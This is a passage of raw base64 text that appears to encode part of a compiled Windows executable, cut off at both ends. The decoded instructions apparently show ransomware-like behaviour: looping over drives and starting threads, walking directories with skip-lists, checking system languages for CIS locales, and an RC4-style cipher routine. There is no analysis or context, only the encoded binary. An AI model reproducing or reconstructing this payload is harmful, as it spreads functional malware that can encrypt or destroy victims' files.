MdGEAAAAACL+GaJDuiq2P//X4vGXovlXcPMzFWL7Gr/aCkGQQBkoQAAAABQUVZXoTwSQAAzxVCNRfRkowAAAACLdQjHRfAAAAAAx0YUDwAAAMdGEAAAAADGBgDHRfwAAAAAoegdQACLfhCDwBrHRfABAAAAO/h3JjlGFHQhagFQi8bo5N7//4TAdBODfhQQiX4QcgSLBusCi8bGBDgAahq4/ElAAIvO6J/k//9qAGjYHUAAg8j/6HDZ//+LxotN9GSJDQAAAABZX16L5V3DzMzMzMzMzMzMzMzMzFWL7Gr/aOkFQQBkoQAAAABQUVZXoTwSQAAzxVCNRfRkowAAAACLdQjHRfAAAAAAM8DHRhQHAAAAx0YQAAAAAGaJBotNDIlF/ItFEItREMdF8AEAAACNeALrBo2bAAAAAGaLCIPAAmaFyXX1K8eLfhDR+APCO/h3KDlGFHQjagFQi8bo2dz//4TAdBWDfhQIiX4QcgSLBusCi8Yz0maJFHiLRQxqAFCDyP/oAgEAAIt9EIvHjVACZosIg8ACZoXJdfUrwtH4UIvHi87o0QEAAIvGi030ZIkNAAAAAFlfXovlXcPMzMzMzMzMzMzMzMzMzFWL7FFTi9mLUxRWi/CLQxCLThBXM/8r0Il9/DvKdjCLVhQr0TvQcifoswIAAIt1CIl+EDPJx0YUBwAAAIv4ZokO6KrW//9fi8ZeW4vlXcNXVoPI/4vz6GUAAACLdQiJfhAz0sdGFAcAAACL+GaJFuh81v//X4vGXluL5V3DzMzMVYvsUVZXM/9XaLwdQACDyP+L8Yl9/OglAAAAiXsQM8nHQxQHAAAAi/iL82aJC+g91v//X4vDXovlXcPMzMzMzFWL7ItVDFOL2ItFCItAEDvCcwpoHEJAAOhZFAAAK8I7w3MCi9iLRhCDyf8ryDvLdwpoNEJAAOjuEwAAhdsPhKYAAABXjTwYgf/+//9/dgpoNEJAAOjQEwAAi04UO89zJ1BXVugo3f//i1UMhf90eYtNCLgIAAAAOUEUcgKLCTlGFHIsiwbrKoX/deSJfhCD+QhyD4sGM9JfZokQi8ZbXcIIAIvGM9JfZokQW13CCACLxo0MUYtWEAPbU1GNBFBQ6PxbAACDxAyDfhQIiX4QchCLBjPJZokMeF+LxltdwggAi8YzyWaJDHhfi8ZbXcIIAFWL7FOL2FaL8YXbdFiLThSD+QhyBIsG6wKLxjvYckaD+QhyBIsG6wKLxotWEI0EUDvDdjGD+QhyFosGK9iLRQjR+1NW6Mf+//9eW13CBACLxivYi0UI0ftTVuix/v//XltdwgQAi0YQi1UIg8n/K8g7yncKaDRCQADouxIAAIXSD4SZAAAAV408EIH//v//f3YKaDRCQADonRIAAItOFDvPcxlQV1bo9dv//4tVCIX/dGyDfhQIci6LBusshf918ol+EIP5CHIQiwYz0l9miRCLxl5bXcIEAF+LxjPSXmaJEFtdwgQAi8aNDBKLVhBRjQRQU1Do11oAAIPEDIN+FAiJfhByEYsGM8lmiQx4X4vGXltdwgQAi8YzyWaJDHhfi8ZeW13CBADMzMzMzMzMzMxVi+xRi0MQV4PP/4P4/3MCi/iLRhCDyf8ryDvPdwpoNEJAAOjhEQAAhf8PhPsAAACNFDiJVfyB+v7//392Cmg0QkAA6MERAACLThQ7ynMfUFJW6Bnb//+LVfyF0g+EyQAAAItGFIP4CHIoiw7rJoXSdfCJVhCD+QhyDIsGZokQi8Zfi+Vdw4vGM9JmiRBfi+Vdw4vOg/gIcgSLBusCi8aLVhAD0lID/1EDx1DosBMAAIPEDDvzdSuLRhSD+AhyBIsO6wKLzoP4CHIMiwZXUVDojBMAAOsvV4vGUVDogBMAAOsjuAgAAAA5QxRyBIsL6wKLyzlGFHIEiwbrAovGV1FQ6JtZAACLTfyDxAyDfhQIiU4Qcg+LBjPSZokUSIvGX4vlXcOLxjPSZokUSIvGX4vlXcPMzMzMzMzMzMzMzMzMzFaL8FeD/gRyG42kJAAAAACLAjsBdRKD7gSDwQSDwgSD/gRz7IX2dEQPtgIPtjkrx3Uxg/4BdjUPtkIBD7Z5ASvHdSCD/gJ2JA+2QgIPtnkCK8d1D4P+A3YTD7ZCAw+2SQMrwcH4H1+DyAFew18zwF7DzMzMzMzMzMzMzMzMzMzMVYvsav9o1whBAGShAAAAAFCB7CgDAAChPBJAADPFiUXwU1ZXUI1F9GSjAAAAADP/ib3U/P//iX38M8BXjU0IZolFnFG7BwAAAIPI/41NnIldsIl9rOhm0v//xkX8ATPSagO4NEpAAI11gIldlIl9kGaJVYDo59X//zPAiV3oiX3kZolF1IPsHIvMiaXM/P//xkX8A1eNRZwz0lCJWRSJeRCDyP9miRHoFNL//+gv7v//jU2cUY2VSP///1KL3ujNBwAAg8Qki/iNddTGRfwE6HzR//+7CAAAAMZF/AM5nVz///9yD4uFSP///1DoThUAAIPEBItF1Dld6HMDjUXUjY3c/P//UVD/FUAQQACJhcz8//+D+P8PhLQEAACNZCQAizVUEEAAaDxKQACNlQj9//9S/9aFwA+EcQQAAGhASkAAjYUI/f//UP/WhcAPhFsEAABoSEpAAI2NCP3//1H/1oXAD4RFBAAAaFBKQACNlQj9//9S/9aFwA+ELwQAAGhgSkAAjYUI/f//UP/WhcAPhBkEAABofEpAAI2NCP3//1H/1oXAD4QDBAAAaIRKQACNlQj9//9S/9aFwA+E7QMAAGigSkAAjYUI/f//UP/WhcAPhNcDAABorEpAAI2NCP3//1H/1oXAD4TBAwAAaMBKQACNlQj9//9S/9aFwA+EqwMAAGjQSkAAjYUI/f//UP/WhcAPhJUDAABo0EpAAI2NCP3//1H/1oXAD4R/AwAAaORKQACNlQj9//9S/9aFwA+EaQMAAGgAS0AAjYUI/f//UP/WhcAPhFMDAABoGEtAAI2NCP3//1H/1oXAD4Q9AwAAaDBLQACNlQj9//9S/9aFwA+EJwMAAGhIS0AAjYUI/f//UP/WhcAPhBEDAABoXEtAAI2NCP3//1H/1oXAD4T7AgAAaHhLQACNlQj9//9S/9aFwA+E5QIAAGiIS0AAjYUI/f//UP/WhcAPhM8CAABotEtAAI2NCP3//1H/1oXAD4S5AgAA9oXc/P//EI2NZP///3R8jZUI/f//Uo1FnFBR6Fz3//+DxAyNnSz////GRfwF6BoGAACL+I111MZF/AboHM///4vz6NXO//+NtWT////GRfwD6MbO//+D7ByNTdSL9Iml0Pz//+iT9f//6H7r//+NTdSL9Iml0Pz//+h+9f//6In8//+DxBzpKQIAAI2FCP3//+hGzv//jYVk////jU24xkX8B+hExf//jbVk////xkX8Cehlzv//jZXY/P//Uo19uMaF2Pz//y7oTwQAAEAzyYv36MXU//+NhQj9//+NjSz////o9M3//42FLP///42NSP///8ZF/Aro78T//421LP///8ZF/AzoEM7//42F2Pz//1CNvUj////Ghdj8//8t6PcDAABAM8mL9+ht1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iPCZoP4Iw+ExQIAAP/Wuf8DAABmI8Fmg/hDD4SxAgAA/9a6/wMAAGYjwmaD+EAPhJ0CAAD/1rn/AwAAZiPBZoP4KA+EiQIAAP/Wuv8DAABmI8Jmg/hCD4R1AgAA/9a5/wMAAGYjwWaD+D8PhGECAAD/1rr/AwAAZiPCZoP4Ig+ETQIAAOjOu///jU246Na///+L+L5kHkAAx0X8AwAAAOiDxv//g8v/jXW4iV386DXG///ogN7//+hr1///jU246JO+//+L+L6AHkAAx0X8BAAAAOjw4P//jXW4iV386GXF///oAMD//+iL4v//g30IAnVEi4XU/v//i0AEjU3U6JTE//+D7ByLzIml1P7//1GNRdTHRfwFAAAA6Om7//+DxATosfP//4PEHI111Ild/OgTxf//6wXoXPr//7i8HUAAjY1k////6Gy8//+L+LhkHkAAjY1I////x0X8BgAAAOhTvP//ULhkTEAAjXWAxkX8B+iR0P//ULisQEAAjXWcxkX8COgP0f//i8iNVdRSi8fGRfwJ6I7R//9QuFRMQACNdbjGRfwK6OzQ//+7EAAAAIPEEDlYFHICiwCLPVARQABqAGoAUGgEQUAAagBqAP/XjXW46G/E//+NddToZ8T//411nOhfxP//jXWA6FfE//+NtUj////oTMT//421ZP///8dF/P/////oOsT//7hwTEAAjY1k////6HrD//85WBRyAosAagBqAFBoBEFAAGoAagD/1421ZP///+gIxP//jY30/v//6D26//+Njdj+///HRfwLAAAA6Fu7//9QuCxMQACNtSz////GRfwM6JbP//9QuJhAQACNtRD////GRfwN6BHQ//+DxAg5WBRyAosAagBqAFBoBEFAAGoAagD/1421EP///+icw///jbUs////6JHD//+Ntdj+///ohsP//4219P7//+gbxP//6cAAAACNTbjorrn//zP/jU3UiX386NG6//9QuCxMQACNdZzGRfwB6A/P//9QuJhAQACNdYDGRfwC6I3P//+7EAAAAIPECDlYFHICiwBXV1BoBEFAAFdX/xVQEUAAOV2UcgyLRYBQ6N8HAACDxAS+DwAAAIl1lIl9kMZFgAA5XbByDItNnFHovwcAAIPEBIl1sIl9rMZFnAA5XehyDItV1FLopAcAAIPEBIN9zAiJdeiJfeTGRdQAc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